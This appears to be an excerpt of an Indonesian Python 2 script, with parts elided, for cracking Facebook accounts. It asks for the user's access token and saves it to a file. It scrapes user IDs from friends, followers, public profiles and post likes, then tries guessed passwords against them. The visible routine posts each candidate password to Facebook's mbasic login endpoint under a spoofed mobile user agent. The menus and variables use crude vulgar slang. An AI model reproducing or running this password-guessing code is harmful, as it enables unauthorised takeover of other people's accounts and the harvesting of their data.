...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Angga-XD
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/AnggaXD13
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/AnggaXD13'''
...
def yayanxd():
    ...
    kontol = raw_input('\n %s[%s?%s] Masukin Token Ngab :%s '%(N,M,N,H))
    ...
    try:
        ...
        print '\n%s[•]%s Selamat Datang %s%s%s Ngentod'%(O,N,K,nama,N);time.sleep(2)
        print '%s[•]%s Mohon Gunakan Script Ini Sewajarnya Saja Ya Ngab'%(O,N);time.sleep(2)
        print '%s[•]%s Jangan Lupa Save WhatsApp Angga-XD Ya:v'%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input('\n%s[•]%s Tekan Enter '%(O,N));wuhan(kontol)
        os.system('xdg-open https://wa.me/6285713275791?text=+اسلام+علیکم')
        moch_yayan()
    except KeyError:
...
def moch_yayan():
    ...
    print ' [\033[0;96m•\033[0m] \033[0;92mNAMA \033[0;97m: %s'%(nama);time.sleep(0.04)
    print ' [\033[0;96m•\033[0m] \033[0;92mIP   \033[0;97m: %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.04)
    print ' [%s1%s] \033[0;92mDump \033[0;97mId Dari Teman'%(O,N);time.sleep(0.04)
    print ' [%s2%s] \033[0;92mDump \033[0;97mId Dari Teman Publik'%(O,N);time.sleep(0.04)
    print ' [%s3%s] \033[0;92mDump \033[0;97mId Dari Total Followers'%(O,N);time.sleep(0.04)
    print ' [%s4%s] \033[0;92mDump \033[0;97mId Dari Like Postingan'%(O,N);time.sleep(0.04)
    print ' [%s5%s] \033[0;92mMulai Crack \033[0;97mFacebook'%(O,N);time.sleep(0.04)
    print ' [%s6%s] Cek Informasi \033[0;92mAkun Facebook'%(O,N);time.sleep(0.04)
    print ' \033[0;97m[%s7%s] Lihat \033[0;92mHasil Crack \033[0;97mSaya'%(O,N);time.sleep(0.04)
    print ' \033[0;97m[%s8%s] Setting \033[0;92mUser Agent'%(O,N);time.sleep(0.04)
    print ' \033[0;97m[%s9%s] Cek Info %sScript%s'%(O,N,O,N);time.sleep(0.04)
    print ' [%s0%s] Keluar (%sAhh Ngecrot%s)'%(M,N,M,N);time.sleep(0.04)
    pepek = raw_input('\n [*] Menu : ')
    if pepek == '':
        print '\n%s[%s×%s] Jangan kosong kentod!'%(N,M,N);time.sleep(3);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    print ' [%s1%s] Metode B-Api v1 (Kenceng Ngab)'%(O,N)
                    print ' [%s2%s] Metode b-Api v2'%(O,N)
                    print ' [%s3%s] Metode Mbasic v1 (Mode Santuy)'%(O,N)
                    print ' [%s4%s] Metode Mbasic v2'%(O,N)
                    print ' [%s5%s] Metode Mobile Fb (Ini Lambat Banget Bego)'%(O,N)
                    __yan__(pwek.split(','))
                    break
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
            	...
            	_kontol = 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.8.2.1;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
